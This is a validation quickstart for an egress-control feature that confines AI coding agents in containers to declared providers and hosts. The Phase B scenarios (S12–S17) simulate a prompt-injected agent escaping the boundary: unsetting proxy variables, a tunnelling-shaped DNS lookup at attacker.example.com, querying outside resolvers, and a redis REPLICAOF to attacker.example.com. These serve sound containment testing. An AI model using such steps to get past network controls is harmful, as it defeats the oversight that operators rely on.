# Quickstart: Validating Egress and Provider Control

**Feature**: 012-egress-provider-control | **Date**: 2026-07-30

Runnable validation. Contract detail is in
[contracts/egress-contract.md](./contracts/egress-contract.md); entities and validation rules are
in [data-model.md](./data-model.md).

## Prerequisites

- A container runtime with Compose v2 (Podman on Linux, Docker on macOS).
- A checkout — the proxy service is generated, so `build` and the compose model both matter.
- At least one real provider credential, to prove the permitted path still works.

---

## Tier 1 — Gate (hermetic, no container)

```bash
scripts/quality-gate.sh
```

Covers, for this feature:

- schema validation: the three states (absent / empty / non-empty), unknown provider name, bare
  string instead of a list, unknown key, bad enum (C1)
- the compose model gains an `egress` service **only** when a declaration is present, and is
  **byte-identical to today** when absent (C2, C8)
- the identity lock still passes — nine volumes, unchanged names (C8)
- `NO_PROXY` precedence: **any** operator value is refused under an enforced declaration, with no
  subset comparison attempted (C6)
- the adherence and built-in-default fixtures agree with `AGENTS` — a fifth agent fails both (C5)

---

> **Phase B syntax note, applying to every step below.** T112/FR-018b **removed** the two-key
> `egress.providers:` / `egress.allow:` syntax — it is a hard refusal naming its replacement, not a
> deprecation. Steps written against it have been rewritten to the unified `egress.allow:` list; if
> you find one that was missed, the tool will refuse it and tell you the replacement.

## Tier 2 — Real container (acceptance)

### S1 — Identity is unchanged — run this first

```bash
agent-container list --json                       # container names + ports
<runtime> volume ls | grep agent-container-dev    # the nine volume names
```

`list --json` emits `containers` only — it has never reported volumes, so the volume half needs the
runtime (or `bin/tests/test_pure_logic.py`'s `VOLUME_SUFFIXES`, which pins the same nine names
hermetically and is what the gate actually checks).

**Expected**: container name, port and all **nine** volume names identical. A tenth volume means
FR-010 was implemented in place rather than deferred (research R9) — **stop**, that is a migration,
not this feature.

### S2 — A declared provider works normally (US1, scenario 1)

```yaml
# .agent-container/environments.yaml
egress:
  allow:
    - provider: anthropic
```

```bash
agent-container up dev
agent-container attach dev      # inside: run the agent, ask it something
```

**Expected**: answers normally. Enforcement that breaks the permitted path is not enforcement.

### S3 — An undeclared provider does not silently succeed (US1, scenario 2) — the core case

Inside the container, with the same declaration in place, reach for a provider that is **not**
declared:

```bash
curl -s -o /dev/null --max-time 20 https://api.openai.com/v1/models; echo "exit=$?"
```

**Expected**: **`exit=56`** — the proxy refused the `CONNECT` with a status. Confirm the status
itself with `-v`, which shows `< HTTP/1.1 403 Filtered`.

**Assert on the exit code, not on `%{http_code}`** (research R10a, measured): `%{http_code}` reports
the *tunnelled* response, which for a refused `CONNECT` never happens — so it reads `000` for a
refusal **and** for a dropped connection alike. Asserting on it would pass for a drop, the exact
failure C3 forbids.

| exit | Meaning |
|---|---|
| **56** | **refused** — correct |
| 28 | **dropped**, not refused — the R1a failure, which produced the 30–40s hangs the probe saw |
| 0 | the request went **around** the proxy — check `NO_PROXY` (S6) before anything else |

### S3a — An indirect endpoint is declarable, and replaces the vendor's hosts (FR-001a/FR-001b)

```yaml
egress:
  allow:
    - { provider: anthropic, hosts: [llm.corp.internal] }
```

```bash
agent-container up dev
# `status` takes NO environment name (see S7) — it reports every declared environment
# and the caller filters, so a bare `status dev` is rejected as an extra argument.
agent-container status --json | jq '.data.environments[] | select(.name=="dev") | .egress.destinations'
```

**Expected**: the allowlist contains `llm.corp.internal` and **not** `api.anthropic.com`; that
entry's `source` reads `declaration`. (T112 replaced the flat `egress.hosts`/`host_source` pair
this step used to read — `jq '.egress.hosts'` now prints `null`, which is a verification step
passing while verifying nothing.) Then, inside the container:

```bash
curl -s -o /dev/null --max-time 20 https://api.anthropic.com/v1/messages; echo "exit=$?"
```

**Expected**: **`exit=56`** — refused (see S3 on why the exit code, not `%{http_code}`). An operator
who routed through a gateway did so to close the direct path. **`exit=0` means `hosts:` was
implemented as additive** — the declaration reads as constrained while the vendor path stays open,
the silent over-permission this feature exists to prevent.

### S4 — The built-in default is disclosed (US2, SC-003) — the motivating defect

Remove the `egress:` block entirely and deploy with **no credential at all**:

```bash
agent-container up dev --agent opencode
```

**Expected**: deploys (FR-004 — unrestricted, unchanged), **and** states once that opencode can
reach a provider without your credential. This is precisely what Feature 010's probe observed
silently.

```bash
agent-container up dev --agent opencode    # again
```

**Expected**: no repeat of the disclosure on ordinary subsequent commands. Noise trains operators
to ignore it.

### S5 — Zero providers is coherent, not degenerate (FR-011)

```yaml
egress:
  allow: []
```

**Expected**: deploys; every outbound model call is refused. The container still runs, the shell
still works, git over SSH is unaffected. An air-gapped environment is a supported state, not a
broken one.

### S6 — `NO_PROXY` cannot silently disable enforcement (C6) — the silent-failure case

```bash
printf 'NO_PROXY=*\n' > .agent-container/dev.env
agent-container up dev
```

**Expected**: **refused**, naming the file and the variable. If it deploys, re-run S3 — the
declaration will read as enforced while enforcing nothing, which is worse than no feature at all.

Now the same with a value that *looks* harmless:

```bash
printf 'NO_PROXY=localhost\n' > .agent-container/dev.env
agent-container up dev
```

**Expected**: **also refused.** The tool attempts no judgement about which values are safe — that
comparison is what C6 deliberately does not implement. A refusal here is the feature working, not
being pedantic.

### S7 — Enforcement strength is stated honestly (C5, SC-004)

```bash
agent-container status --json | jq '.data.environments[] | select(.name=="dev")'
```

`status` takes **no** environment name — it reports every declared environment and the caller
filters. That is more useful than one row, and it kept the CLI from growing an argument merely to
match this document.

**Expected**: `egress.enforcement`, `egress.enforced`, `egress.destinations` (the **effective**
allowlist, each entry tagged `source: tool | declaration` and `port`), `honours_proxy`, and
`builtin_default_provider`.

Check the two pairs that must not be conflated:

| Field | Undeclared | `allow: []` |
|---|---|---|
| `declared` | `false` | `true` |
| `unrestricted` | **`true`** | **`false`** |

Both have an empty `destinations` list and they are **opposites** — a caller must never have to
infer which from emptiness.

`declared` and `enforced` are likewise distinct: an advisory declaration that cannot be enforced
reads `declared: true, enforced: false` with a `not_enforced_reason`.

Then read the prose output — **and expect the PACKET-LEVEL statement, not the proxy one.** The
statement is mode-aware since T140: on a deployment that got the boundary it says enforcement is
packet-level and does not depend on the agent's cooperation, and names its residual limits (not
content inspection; TLS never terminated so traffic to a declared host is unseen; the connection is
spliced to the address the *client* chose, so a declared name does not constrain the address; and
`egress.sidecars_outside` is outside entirely). The older text below — a proxy binding only clients
that honour it, overridable from `~/.agent-env/env` (FR-008a) — is the **fallback** statement, and
seeing it on a Phase B deployment means enforcement is not what you think it is. Either way, any
phrasing implying an absolute guarantee fails SC-004.

### S8 — Strict mode refuses what advisory permits (FR-007b, SC-004a)

**Do not use "an agent not on the adherence list" — that stopped being an obstacle in Phase B.**
Transparent enforcement needs nothing *from the agent*, so an unprobed agent still gets the
boundary (`egress_enforcement_mode({"allow": []}, "some-future-agent")` → `transparent`). The two
obstacles that remain are the ones the tool can actually see: **the egress image sources are not
reachable** (no `image/egress/Dockerfile` in a checkout — run from a non-editable PyPI install), or
an **operator override redefining the `egress` service** in `dev.services.yaml`. Use one of those:

```bash
agent-container up dev            # enforcement: advisory
agent-container up dev            # enforcement: strict
```

**Expected**: advisory deploys and states the **specific** obstacle — never "unsupported", since
the whole point of FR-021 is that the operator can tell which enforcement they obtained — while
strict **refuses**. Zero deployments proceeding with an unenforceable declaration.

There is no third, weaker "deployed but cooperative" outcome to look for: every obstacle above rules
out the proxy just as completely as the boundary, so the modes are `transparent` and `none` (spec
FR-021a). Whether the daemon will grant `NET_ADMIN` is not knowable before running the container, and
that case **fails closed** in the entrypoint rather than being guessed at here.

### S9 — The proxy dies with the environment (FR-007)

```bash
agent-container down dev
<runtime> ps -a | grep dev        # expect: no proxy container
agent-container wipe dev -y
<runtime> volume ls | grep agent-container-dev   # expect: no output
```

**Expected**: nothing left behind. The proxy is in the same compose project, so this needs no new
teardown step — if it does, it was put in the wrong file (C2).

### S9a — No credential value reaches any generated artifact (FR-009, SC-007)

With an environment declaring **both** providers and credentials, seed a sentinel and look for it:

```bash
export ANTHROPIC_API_KEY='sk-ant-SENTINEL-do-not-appear'
agent-container up dev
grep -r 'SENTINEL' "$XDG_STATE_HOME/agent-container/"     # expect: no hits
agent-container status --json | grep SENTINEL              # expect: no hits (takes no name, see S7)
```

**Expected**: no hits anywhere — the generated compose model, the proxy's generated config, and
`--json`. A *known* sentinel is the point: grepping for key-shaped strings would only test what the
person writing the check happened to imagine.

### S10 — Rootlessness is unchanged (SC-005)

```bash
agent-container attach dev        # inside: id; capsh --print 2>/dev/null || true
```

**Expected**: identical to before the feature. No added capability, no `sudo`, nothing installed at
runtime.

### S11 — Existing environments keep working (FR-012)

Deploy an environment whose spec predates this feature (no `egress:` key at all):

```bash
agent-container up legacy
```

**Expected**: deploys exactly as before, with no proxy service in the generated model — and no
change in effective permissions beyond the one-time disclosure.

---

## Tier 3 — Deferred, and why

**FR-010 / US3 (egress events outlive the container) is not validated here.** It needs durable
per-container storage, which means a tenth volume and therefore an identity migration (research
R9). That store is shared with Feature 016 and should be paid for once, by whichever feature ships
it first — expected to be 016, since the machinery is its subject. **SC-006 is therefore not yet in
force**, rather than silently failing.

If it were implemented in this feature, S1 would fail — which is the guard working, not a bug.

---

## Definition of done

| Check | Source |
|---|---|
| Identity unchanged — nine volumes | S1 — **the blocking one** |
| Gate green | Tier 1 |
| Permitted path works, undeclared path refused (**curl exit 56**) | S2, S3 |
| Built-in default disclosed once | S4 |
| `NO_PROXY` cannot disable enforcement | S6 — **the silent-failure case** |
| Strength stated honestly, no overclaim | S7 |
| No credential value in any generated artifact | S9a — **SC-007** |
| Rootlessness unchanged | S10 |
| Pre-feature environments unchanged | S11 |
| FR-010 deferred deliberately, not forgotten | Tier 3 |

---

# Phase B validation (US4/US5)

**These cannot be unit-tested.** US4's claim is about what a *hostile process* cannot do, so every
scenario below drives the container adversarially rather than cooperatively. A cooperative test
would pass against Phase A's mechanism too, and prove nothing new.

## S12 — The agent unsets everything and still cannot get out (SC-008)

```bash
agent-container attach dev
# inside, as the agent would after a prompt injection:
unset HTTPS_PROXY HTTP_PROXY https_proxy http_proxy NO_PROXY no_proxy
curl -s -o /dev/null --max-time 15 https://api.openai.com/v1/models; echo "exit=$?"
```

**Expected**: **non-zero** — measured **exit 6**, "could not resolve host", because with the
variables gone the name goes to the sidecar resolver, which refuses it. Under Phase A this returns
**0**; that difference *is* the feature.

```bash
echo 'export HTTPS_PROXY=' >> ~/.agent-env/env    # survives teardown, sourced by every shell
bash -lc 'curl -s -o /dev/null --max-time 15 https://api.openai.com/v1/models'; echo "exit=$?"
```

**Expected**: **still non-zero.** This is the hole FR-008a had to *disclose* under Phase A and
Phase B actually closes.

**Then run the positive case in the same shell, and do not skip it:**

```bash
curl -s -o /dev/null --max-time 15 https://api.anthropic.com/v1/messages; echo "declared=$?"
```

**Expected**: **0** — meaning `curl` verified the chain against public CAs, which is also the
Constitution III check: a spliced connection presents the *real* server certificate, and a
locally-issued CN would mean squid has silently become `bump`. **A boundary that refuses everything
passes every refusal step above while being completely broken**, and broken-closed is the failure
this mechanism makes easy (T136a, R19c).

## S13 — A non-standard port is not a way around it (SC-009)

**Read the assertion note before running this — a naive `$?` check reads as a PASS on the wrong
grounds and as a FAIL on the right ones.** `curl` exits **0 for a `403`**, and with the diagnostic
proxy variables set (they are, by default) an undeclared port is now *refused with a status* by
squid rather than dropped — the improvement R1a asked for. So run **both** probes:

```bash
# 1. with the proxy variables set — expect a 403 FROM SQUID, and curl exit 0
curl -s -o /dev/null -w 'http=%{http_code}\n' --max-time 15 http://example.com:8080/
echo "8080-proxied exit=$?"
curl -s -o /dev/null -w 'http=%{http_code}\n' --max-time 15 http://example.com:1337/
echo "1337-proxied exit=$?"

# 2. the one that tests NETFILTER rather than the agent's cooperation
env -u HTTPS_PROXY -u HTTP_PROXY -u https_proxy -u http_proxy \
  curl -s -o /dev/null --max-time 15 http://example.com:8080/; echo "8080-direct=$?"
env -u HTTPS_PROXY -u HTTP_PROXY -u https_proxy -u http_proxy \
  curl -s -o /dev/null --max-time 15 http://example.com:1337/; echo "1337-direct=$?"

ssh -o ConnectTimeout=10 git@github.com; echo "ssh=$?"
```

**Expected**: probe 1 reports `http=403` (a refusal, named); probe 2 is **non-zero** (measured:
exit 6 — the name is not declared, so it does not even resolve). **A 2xx or 3xx from probe 1 is the
failure**, and so is `0` from probe 2.

**This is the scenario the first design sketch got wrong** — redirecting only 80/443 with a
default-accept policy lets `8080` sail straight through, which is *worse than no control* because
the declaration reads as constraining while the agent reaches anything it likes on an unusual port.

> The corresponding acceptance test asserted `returncode != 0` and **failed while the port was
> properly closed** (research R21, T129e). Do not "fix" it by inverting to `returncode == 0`: that
> also passes when the agent genuinely *reaches* the port, which is the whole hole SC-009 exists to
> catch.

## S14 — A declared non-HTTP destination works, and only it (SC-010)

```yaml
egress:
  allow:
    - provider: anthropic
    - host: github.com
      port: 22
```

```bash
ssh -T -o ConnectTimeout=10 git@github.com;        echo "declared=$?"
ssh -T -o ConnectTimeout=10 git@gitlab.com;        echo "other-host=$?"
ssh -T -o ConnectTimeout=10 -p 443 git@github.com; echo "other-port=$?"
```

**Expected**: the declared pair succeeds (`ssh -T git@github.com` prints GitHub's greeting and exits
1 — that is a *successful* connection, so read the message, not the code); the other host fails to
**resolve** (undeclared names are REFUSED by the sidecar resolver); the other port **times out**,
because `github.com` resolves — a ported entry is in the DNS allowlist too — but nothing permits
443 to it. That host and that port, not the protocol generally.

> **Caution while T147 is open**: `iptables -d github.com` resolves and *pins* the addresses at
> rule-install time. If this step fails for the declared pair after a previously-working deploy,
> suspect a rotated address before suspecting the declaration.

## S15 — DNS cannot be used to tunnel out (SC-012, SC-013)

```bash
getent hosts api.anthropic.com          # declared  -> resolves
getent hosts api.openai.com             # undeclared -> does not
getent hosts ZXhmaWx0cmF0ZWQ.attacker.example.com   # tunnelling-shaped -> does not
dig +time=5 +tries=1 @8.8.8.8 attacker.example.com  # cannot be asked at all
agent-container logs dev --egress | grep -i refused  # the refusals are a RECORD
```

**Expected**: only the declared name resolves. **`dig @8.8.8.8` does not return Google's answer and
is not silently answered by ours either — it fails to connect** ("no servers could be reached").
That is the design, not a defect: FR-020a is met by **dropping** port 53 rather than redirecting it
(research R18, measured). A REDIRECT would *answer* an agent that asked Google, substituting our
resolver behind its back; the DROP means every resolver except ours is **unreachable**, so it cannot
ask. Any earlier wording here that said the query is "redirected" described a design that was tried
four ways and abandoned.

The last line is T130's half of the same requirement: a refused lookup must leave a **record**.
`REFUSED` means the name is not declared; `NXDOMAIN` means it genuinely does not exist — and an
`NXDOMAIN` for an undeclared name is the tell that the DNS rules landed in the wrong position rather
than that the policy is off.

A forwarding-but-faithful resolver would pass the first three and fail the point — **the
exfiltration is in the question, not the answer.**

## S16 — The agent gained no privilege (SC-011)

```bash
<runtime> inspect agent-container-dev --format '{{.HostConfig.CapAdd}}'
<runtime> inspect agent-egress-dev   --format '{{.HostConfig.CapAdd}}'
```

**Expected**: `[]` for the agent, `[NET_ADMIN]` for the proxy. **If the agent shows any capability,
stop** — the feature has inverted its own principle, granting privilege to the container running
untrusted code.

## S17 — A sidecar cannot launder egress (SC-014)

```yaml
# dev.services.yaml
services:
  redis:
    image: redis:7
```

```bash
# 127.0.0.1, NOT `-h redis`. Placing the sidecar inside the boundary means it SHARES
# this network namespace, so service-name DNS no longer resolves between the two and
# `-h redis` fails on the lookup — which would look like the test passing for the
# wrong reason. The sidecar is simply on loopback now. (T149 is open on making the
# tool say this rather than leaving the operator to discover it.)
redis-cli -h 127.0.0.1 REPLICAOF attacker.example.com 6379
sleep 2
redis-cli -h 127.0.0.1 INFO replication | grep -E 'master_link_status|master_host'
```

**Expected**: refused — `master_link_status:down`, never `up`. Assert on the **replication state**,
not on the `REPLICAOF` command's own reply: redis answers `OK` immediately and connects
asynchronously, so the `OK` says nothing about whether the connection was permitted.

The agent needn't escape the namespace — it need only ask something that already has the access. A
design that locks the agent down and leaves sidecars outside produces an environment reporting
`enforced: true` while two lines of redis walk out.

## S18 — `git push` still works, or the feature is unshippable

```bash
git push        # over SSH, with port 22 declared per S14
```

**Expected**: succeeds. **Default-deny kills `git push` unless SSH is declared**, which is Hard
Constraint #1 breaking from the opposite direction to Phase A's HTTPS case. If this fails, the
deploy-time check (FR-003c's SSH arm) did not fire and should have — and note that arm fires **only
under transparent enforcement**: under the Phase A proxy `ssh` ignores `https_proxy` and the push
genuinely works, so a warning there would train operators to ignore the check.

## S19 — An undeclared environment is untouched (FR-004)

```bash
agent-container up legacy      # no egress: key at all
```

**Expected**: no netfilter rules, no forced DNS, unrestricted. **Default-deny applies only to
environments that opted in, never retroactively** — an upgrade must not air-gap anyone.

## Definition of done — Phase B

| Check | Source |
|---|---|
| Agent capability set unchanged | S16 — **the blocking one** |
| Evasion fails: unset vars, shell env | S12 |
| Non-standard ports fail | S13 |
| Declared non-HTTP works, narrowly | S14 |
| DNS tunnelling closed | S15 |
| Sidecar laundering closed | S17 |
| `git push` survives | S18 |
| Undeclared environments untouched | S19 |
